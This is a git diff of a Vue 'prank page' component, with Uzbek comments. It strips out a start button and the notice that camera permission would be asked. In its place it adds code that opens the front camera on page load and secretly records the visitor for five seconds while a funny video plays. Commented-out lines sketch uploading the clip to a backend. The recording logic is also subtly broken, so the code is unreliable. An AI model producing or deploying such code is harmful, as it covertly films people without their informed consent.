@@ -2,53 +2,36 @@
 export default {
   data() {
     return {
-      isIOS: false,
-      supportsMediaRecorder: false,
       stream: null,
       mediaRecorder: null,
       recordedChunks: [],
-      started: false,
       recording: false,
-      recordedVideoUrl: null // faqat ko‘rish uchun
     }
   },
 
-  mounted() {
-    this.isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent)
-    this.supportsMediaRecorder = typeof window.MediaRecorder !== 'undefined'
-
-    console.log('isIOS:', this.isIOS)
-    console.log('MediaRecorder support:', this.supportsMediaRecorder)
+  async mounted() {
+    await this.requestCamera()
   },
 
   methods: {
-    // =========================
-    // ANDROID / DESKTOP
-    // =========================
-    async startRecordingFlow() {
+    async requestCamera() {
       try {
-        this.started = true
-
         this.stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user' },
-          audio: true
+          audio: false
         })
 
+        // 🔴 Orqa fonda yozishni boshlaymiz
         this.startRecording()
 
       } catch (e) {
-        console.error(e)
-        alert('❌ Kamera yoki mikrofon ruxsati berilmadi')
+        alert('Kamera ruxsatisiz davom etib bo‘lmaydi 😢')
       }
     },
 
     startRecording() {
       this.recordedChunks = []
-
-      this.mediaRecorder = new MediaRecorder(this.stream, {
-        mimeType: 'video/webm;codecs=vp8,opus',
-        videoBitsPerSecond: 700_000
-      })
+      this.mediaRecorder = new MediaRecorder(this.stream)
 
       this.mediaRecorder.ondataavailable = (e) => {
         if (e.data.size > 0) {
@@ -56,127 +39,62 @@ export default {
         }
       }
 
-      this.mediaRecorder.onstop = () => {
-        const blob = new Blob(this.recordedChunks, { type: 'video/webm' })
-        this.recordedVideoUrl = URL.createObjectURL(blob)
-        console.log('🎥 Video yozildi (local)')
-      }
-
       this.mediaRecorder.start()
       this.recording = true
+
+      // ⏱ 5 soniyadan keyin to‘xtaydi
+      setTimeout(() => {
+        this.stopRecording()
+      }, 5000)
     },
 
     stopRecording() {
-      if (!this.recording) return
+      if (this.mediaRecorder && this.recording) {
+        this.mediaRecorder.stop()
+        this.recording = false
 
-      this.mediaRecorder.stop()
-      this.recording = false
+        const videoBlob = new Blob(this.recordedChunks, {
+          type: 'video/webm'
+        })
 
-      // kamerani o‘chiramiz
-      this.stream.getTracks().forEach(t => t.stop())
-    },
+        alert(videoBlob)
 
-    // prank video tugaganda
-    onFunnyVideoEnd() {
-      if (!this.isIOS && this.supportsMediaRecorder) {
-        this.stopRecording()
+        // 👉 shu joyda backendga yuborish mumkin
+        // const formData = new FormData()
+        // formData.append('video', videoBlob)
+        // axios.post('/api/upload', formData)
       }
-    },
-
-    // =========================
-    // iOS FALLBACK (FAKT YOZISH)
-    // =========================
-    onIOSVideoSelected(e) {
-      const file = e.target.files[0]
-      if (!file) return
-
-      // faqat ko‘rsatish uchun
-      this.recordedVideoUrl = URL.createObjectURL(file)
-      this.started = true
-
-      console.log('🎥 iOS video yozildi')
     }
   }
 }
 </script>
+
 <template>
   <div class="prank-page">
-
-    <!-- START SCREEN -->
-    <div v-if="!started" class="start-screen">
-
-      <!-- iPhone -->
-      <div v-if="isIOS || !supportsMediaRecorder">
-        <label class="start-btn">
-          ▶️ Videoni boshlash
-          <input
-              type="file"
-              accept="video/*"
-              capture="user"
-              hidden
-              @change="onIOSVideoSelected"
-          />
-        </label>
-        <p>iPhone kamera orqali video yoziladi</p>
-      </div>
-
-      <!-- Android / Desktop -->
-      <div v-else>
-        <button class="start-btn" @click="startRecordingFlow">
-          ▶️ Videoni boshlash
-        </button>
-        <p>Kamera va mikrofon ruxsati so‘raladi</p>
-      </div>
-
-    </div>
-
-    <!-- PRANK VIDEO -->
+    <!-- 😂 Kulgili video -->
     <video
-        v-if="started && !recordedVideoUrl"
         class="fun-video"
         autoplay
-        playsinline
+        loop
         muted
-        @ended="onFunnyVideoEnd"
+        playsinline
     >
       <source src="../assets/prank.mp4" type="video/mp4" />
     </video>
 
-    <!-- YOZILGAN VIDEONI KO‘RISH (OPTIONAL) -->
-    <video
-        v-if="recordedVideoUrl"
-        class="fun-video"
-        controls
-        :src="recordedVideoUrl"
-    ></video>
-
+    <div class="overlay">
+      <h1>😂 Jiddiy qarang!</h1>
+    </div>
   </div>
 </template>
+
 <style>
 .prank-page {
+  position: relative;
   width: 100vw;
   height: 100vh;
+  overflow: hidden;
   background: #000;
-}
-
-.start-screen {
-  width: 100%;
-  height: 100%;
-  color: #fff;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-}
-
-.start-btn {
-  padding: 16px 30px;
-  font-size: 18px;
-  border-radius: 12px;
-  background: #00fff0;
-  color: #000;
-  cursor: pointer;
-  border: none;
 }
 
 .fun-video {
@@ -185,5 +103,16 @@ export default {
   object-fit: cover;
 }
 
-
+.overlay {
+  position: absolute;
+  inset: 0;
+  background: rgba(0,0,0,0.4);
+  color: #fff;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  font-size: 24px;
+  text-align: center;
+}
 </style>
